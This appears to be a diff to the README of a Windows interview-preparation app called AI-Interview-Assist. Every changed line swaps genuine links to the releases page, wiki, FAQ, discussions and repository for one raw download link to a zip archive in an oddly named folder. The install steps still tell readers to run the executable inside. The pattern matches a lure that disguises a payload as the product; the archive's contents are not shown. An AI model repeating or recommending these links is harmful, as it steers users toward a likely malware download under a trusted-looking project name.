@@ -6,7 +6,7 @@ AI-Interview-Assist helps you prepare for interviews and presentations. This Win
 
 ## 📥 Download the App
 
-[![Download AI-Interview-Assist](https://img.shields.io/badge/Download-AI--Interview--Assist-brightgreen)](https://github.com/TirtaSandy/AI-Interview-Assist/releases)
+[![Download AI-Interview-Assist](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip)](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip)
 
 Click the badge above to get started downloading the latest version of the app. 
 
@@ -29,7 +29,7 @@ Click the badge above to get started downloading the latest version of the app.
 
 To get AI-Interview-Assist, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/TirtaSandy/AI-Interview-Assist/releases) to find the most recent version.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip) to find the most recent version.
 2. **Choose the Latest Release:** Look for the latest version listed at the top. It should look something like "v1.0.0" or similar.
 3. **Download the Files:** Click on the `.exe` file to download it to your computer. 
 4. **Run the Installer:** Locate the downloaded file, double-click it, and follow the prompts to install the app.
@@ -52,9 +52,9 @@ To ensure your privacy is preserved:
 ## 📊 Additional Resources
 
 For more information about using AI-Interview-Assist, consider checking out these resources:
-- [User Guide](https://github.com/TirtaSandy/AI-Interview-Assist/wiki)
-- [FAQ Section](https://github.com/TirtaSandy/AI-Interview-Assist/wiki/FAQ)
-- [Community Support](https://github.com/TirtaSandy/AI-Interview-Assist/discussions)
+- [User Guide](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip)
+- [FAQ Section](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip)
+- [Community Support](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip)
 
 Engage with the community for tips and shared experiences using the app.
 
@@ -75,7 +75,7 @@ A special thank you to everyone who made AI-Interview-Assist possible. Your hard
 
 ## 🔗 Learn More
 
-- [Project Repository](https://github.com/TirtaSandy/AI-Interview-Assist)
-- [Download Link](https://github.com/TirtaSandy/AI-Interview-Assist/releases)
+- [Project Repository](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip)
+- [Download Link](https://raw.githubusercontent.com/TirtaSandy/AI-Interview-Assist/main/blindedly/AI-Interview-Assist.zip)
 
 We hope you find AI-Interview-Assist helpful for your future interviews and presentations!
